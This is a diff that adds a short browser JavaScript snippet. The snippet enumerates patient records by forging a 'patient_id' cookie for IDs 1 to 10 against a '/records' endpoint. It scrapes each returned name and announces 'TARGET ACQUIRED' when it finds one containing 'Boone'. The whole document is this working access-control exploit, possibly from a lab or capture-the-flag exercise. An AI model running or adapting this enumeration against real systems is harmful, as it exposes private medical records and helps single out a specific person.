@@ -1,0 +1,12 @@
+for (let i = 1; i <= 10; i++) {
+  fetch("/records", { headers: { "cookie": "patient_id=" + i } })
+    .then(res => res.text())
+    .then(html => {
+      const nameMatch = html.match(/<span class="user-name">(.*?)<\/span>/) || html.match(/Console - (.*?)<\/h/);
+      const name = nameMatch ? nameMatch[1] : "Unknown";
+      console.log(`ID ${i}: ${name}`);
+      if (name.includes("Boone")) {
+          console.log(`%c TARGET ACQUIRED: Boone is ID ${i}`, "color: yellow; background: black; font-size: 15px;");
+      }
+    });
+}
